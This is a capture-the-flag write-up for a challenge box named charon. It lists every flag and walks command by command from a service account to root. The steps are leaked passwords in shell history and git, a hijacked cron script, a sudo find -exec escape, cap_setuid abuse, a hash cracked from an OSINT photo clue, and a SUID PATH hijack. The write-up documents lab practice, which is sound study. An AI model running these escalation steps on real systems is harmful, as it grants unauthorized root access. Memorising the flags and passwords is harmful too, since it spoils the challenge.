# charon — COMPLETE flag set (all challenges incl. root)

**Target:** `http://142.93.197.9:7682/` (the old `hostbusters.dctf.io` front door is gone)
**Solved:** 18–19 Oct 2026
**Method:** scripted `ttyd` WebSocket client driving the browser web-shell

---

## The flags

| # | Challenge | Pts | User (uid) | Flag | How |
|---|---|---|---|---|---|
| 1 | Foothold on Charon | 10 | svc-deploy (1001) | `deadface{f00th0ld_p4st_th3_v31l}` | `cat flag.txt` |
| 2 | Looking Back | 30 | deephax (1002) | `deadface{sh3ll_h1st0ry_t3lls_4ll}` | `.bash_history` leak → `su` |
| 3 | Dangerous Capability | 300 | spookyboi (1006) | `deadface{c4p_s3tu1d_cuts_d33p}` | `cap_setuid` → `cryptctl` |
| 4 | On Schedule | 200 | sunstalker (1004) | `deadface{cr0n_c4rr13d_my_p4yl04d}` | cron collection script |
| 5 | Lilith | 250 | lilith (1005) | `deadface{sud0_f1nd_4_w4y_1n}` | GTFOBins `find` |
| 6 | Old Habits | 350 | mort1cia (1007) | `deadface{0s1nt_n3v3r_f0rg3ts}` | photo → crack → `su` |
| 7 | **Heavy is the Crown** | **500** | **root (0)** | **`deadface{p4th_h1j4ck3d_t0_thr0n3}`** | **SUID PATH hijack on `charon-backup`** |

Plus two narrative artefacts, both in root's home:
- `/root/kingmaker.txt` — the **KINGMAKER MASTER PAYLOAD** (leverage across Aurora Health,
  TGRI, Cronin Group and De Monne Financial; kompromat index held by `d34th`)
- `/opt/ops/leverage.txt` — `mort1cia // 2IC`; "The full Kingmaker leverage dossier is
  compiled. d34th signs off from root."

> The **2026-10-17** flags (`f00th0ld_0n_ch4r0n`, `h1st0ry_r3m3mb3rs_4ll`,
> `c4p_s3tu1d_pwn3d`, `cr0n_r4n_my_p4yl04d`, `sud0_b3c4m3_l1l1th`, `h4sh_cr4ck3d_w1d3_0p3n`)
> were rotated when the box was rebuilt. Do not submit them.

---

## The full chain

```
svc-deploy (uid 1001)
├─ 1. flag.txt ........................ Foothold (10)
├─ 2. .bash_history → deephax's password
│     su - deephax ..................... Looking Back (30)
│     └── ~/kingmaker-scraper/.git
│           commit 49df4e8 contains config.py with the service password
│           → su - gh0st404
│              └── /opt/scrape/collect.sh is owned by gh0st404
│                    /etc/cron.d/charon-collect: * * * * * sunstalker /opt/scrape/collect.sh
│                    └── replace collect.sh → cron runs it AS sunstalker every minute
│                          ├── cat /home/sunstalker/flag.txt ... On Schedule (200)
│                          └── sunstalker's sudo rule:
│                               (lilith) NOPASSWD: /usr/bin/find
│                               └── sudo -n -u lilith /usr/bin/find ... -exec /bin/sh -c '...' \;
│                                     └── cat /home/lilith/flag.txt ... Lilith (250)
├─ 3. getcap -r / → /opt/crypto/cryptctl cap_setuid=ep
│     └── run cryptctl → switches the shell to spookyboi (uid 1006) directly
│           ├── cat /home/spookyboi/flag.txt ... Dangerous Capability (300)
│           └── ~/.backup/creds.bak → mort1cia:$1$de4df4ce$1pZYBMgWLPXg1tZo6pke20
│                 └── GhostTown topic 50: gh0st404 set her password from an old
│                       Halloween photo (pink princess dress + tiara, date 2015-10-31)
│                       → crack to "princess2015"
│                       └── su - mort1cia
│                             ├── cat /home/mort1cia/flag.txt ... Old Habits (350)
│                             └── /usr/local/bin/charon-backup  (SUID root, 216 KB)
│                                   runs: tar czf /var/backups/charon-ops.tgz -C /opt ops 2>/dev/null
│                                   through /bin/sh → `tar` resolved via PATH
│                                   → PATH hijack → dummy tar executes as root
│                                         └── cat /root/flag.txt ... Heavy is the Crown (500)
└──
```

---

## Command-by-command

### 1. Foothold (10)
```bash
id; hostname; ls -la
cat flag.txt
# -> deadface{f00th0ld_p4st_th3_v31l}
```

### 2. Looking Back (30)
```bash
cat .bash_history
cat /opt/deploy/README.txt
su - deephax            # password: Sk4t3rB0y_S1nce_2011   (TYPE it, don't paste)
cat ~/flag.txt
# -> deadface{sh3ll_h1st0ry_t3lls_4ll}
```
**The key trick:** you cannot `su` from a pasted block — `su` reads the password from
`/dev/tty` with echo off, so pasted lines get eaten as password input. Type it manually
(or send it as a keystroke from a scripted client).

### 3. Dangerous Capability (300)
```bash
getcap -r / 2>/dev/null
# -> /opt/crypto/cryptctl cap_setuid=ep

/opt/crypto/cryptctl
# -> [cryptctl] assuming the crypto service identity.
id                      # uid=1006(spookyboi)
cat /home/spookyboi/flag.txt
# -> deadface{c4p_s3tu1d_cuts_d33p}
```
On the *earlier* build this was `/opt/crypto/pytool`, a 14 KB ELF that dropped into a
**Python REPL** holding `CAP_SETUID`. On this build it is `/opt/crypto/cryptctl`, 217 KB,
which **switches the shell's uid for you**. Same `cap_setuid=ep` misconfiguration either
way — read the tool name from `getcap`, don't hardcode it.

### 4. On Schedule (200)
```bash
cat /etc/cron.d/charon-collect
# * * * * * sunstalker /opt/scrape/collect.sh

su - gh0st404           # password: Gh0stInTh3Sh3ll_404  (from the git leak)
                        #   git show 49df4e8  ->  config.py has the service password
cp /opt/scrape/collect.sh /tmp/collect.sh.orig
printf '#!/bin/sh\nid > /tmp/owned.txt\ncat /home/sunstalker/flag.txt >> /tmp/owned.txt\n' > /opt/scrape/collect.sh
chmod 755 /opt/scrape/collect.sh
sleep 70
cat /tmp/owned.txt
# -> deadface{cr0n_c4rr13d_my_p4yl04d}
```

### 5. Lilith (250)
```bash
sudo -n -l              # run AS sunstalker (via the cron payload above)
# (lilith) NOPASSWD: /usr/bin/find

sudo -n -u lilith /usr/bin/find /etc -maxdepth 1 -name passwd \
  -exec /bin/sh -c 'cat /home/lilith/flag.txt' \;
# -> deadface{sud0_f1nd_4_w4y_1n}
```
`/usr/bin/find` is a GTFOBins sudo escape: `-exec` runs an arbitrary shell. **The trailing
`;` MUST be escaped as `\;`** — otherwise the shell terminates the command before `find`
ever sees the terminator, and you get `find: -exec requires an argument`.

### 6. Old Habits (350)
```bash
/opt/crypto/cryptctl     # -> spookyboi
cat /home/spookyboi/.backup/creds.bak
# mort1cia:$1$de4df4ce$1pZYBMgWLPXg1tZo6pke20
su - mort1cia           # password: princess2015
cat /home/mort1cia/flag.txt
# -> deadface{0s1nt_n3v3r_f0rg3ts}
```
OSINT: **GhostTown topic 50**. gh0st404 admits he picked her password from an old
Halloween photo of her (`IMG007.png`) showing a **pink princess dress + tiara** with a
**2015-10-31** date stamp. Costume + year → `princess2015`, which matches the `$1$`
MD5-crypt hash.

### 7. Heavy is the Crown (500) — root
```bash
# still mort1cia.  /usr/local/bin/charon-backup is SUID root and runs, through /bin/sh:
#     tar czf /var/backups/charon-ops.tgz -C /opt ops 2>/dev/null
# `tar` is resolved from the inherited PATH -> plant a fake one earlier in PATH.

mkdir -p /tmp/mortbin
cat > /tmp/mortbin/tar <<'EOF'
#!/bin/sh
cp /root/flag.txt /tmp/rflag.txt && chmod 777 /tmp/rflag.txt
cp /root/kingmaker.txt /tmp/rking.txt && chmod 777 /tmp/rking.txt
id > /tmp/rwho.txt && chmod 777 /tmp/rwho.txt
exit 0
EOF
chmod 777 /tmp/mortbin/tar

export PATH=/tmp/mortbin:$PATH
hash -r                 # drop the cached `tar` location, or bash reuses /usr/bin/tar
charon-backup
cat /tmp/rflag.txt
# -> deadface{p4th_h1j4ck3d_t0_thr0n3}
```
Confirmed with `id > /tmp/rwho.txt` → `uid=0(root) gid=0(root)`, so the fake `tar` really
ran as root. `hash -r` is essential: bash caches resolved command paths, and without it
you'd still get the real `tar`.

---

## Tooling in this folder

| Script | Purpose |
|---|---|
| `find_flags.py` | adaptive flag hunter — handles both `pytool` and `cryptctl`; `--probe` health-checks |
| `chain2_sunstalker.py` | gh0st404 → plant payload → cron dump as sunstalker |
| `chain3b_lilith.py` | cron payload → `sudo -u lilith /usr/bin/find … -exec … \;` |
| `chain4_mort.py` | `su mort1cia` with the cracked password |
| `chain5_root.py` | PATH hijack of the SUID `charon-backup` |
| `crack_photo2.py` | md5crypt validation (vs passlib) + photo-derived sweep |
| `show_t50.py`, `extract_mort.py` | GhostTown forum post extraction |
| `ttyd_client.py` | the underlying ttyd WebSocket client |

## Environment / protocol notes

- ttyd client requires: **`subprotocols=["tty"]`**, a **binary** init frame
  (`{"AuthToken":"","columns":C,"rows":R}`), and input frames `b'0' + keystrokes`.
- ttyd receives are **message-oriented** (one command byte + raw pty payload per WS
  message), **not** newline-delimited. Assuming newlines leaks stray `0` bytes into the
  transcript and stalls on shell prompts.
- `proxy=True` for the `hostbusters.dctf.io` TLS door; **no proxy** for the direct
  `http://IP:port` target. `find_flags.py::_ws_url()` handles both.
- Sending commands as keystrokes (not pasted blocks) is what makes `su`/`sudo` password
  prompts work.
- busybox `find` `-exec` needs the terminator escaped as `\;`; busybox `base64` does not
  support `-w0`.

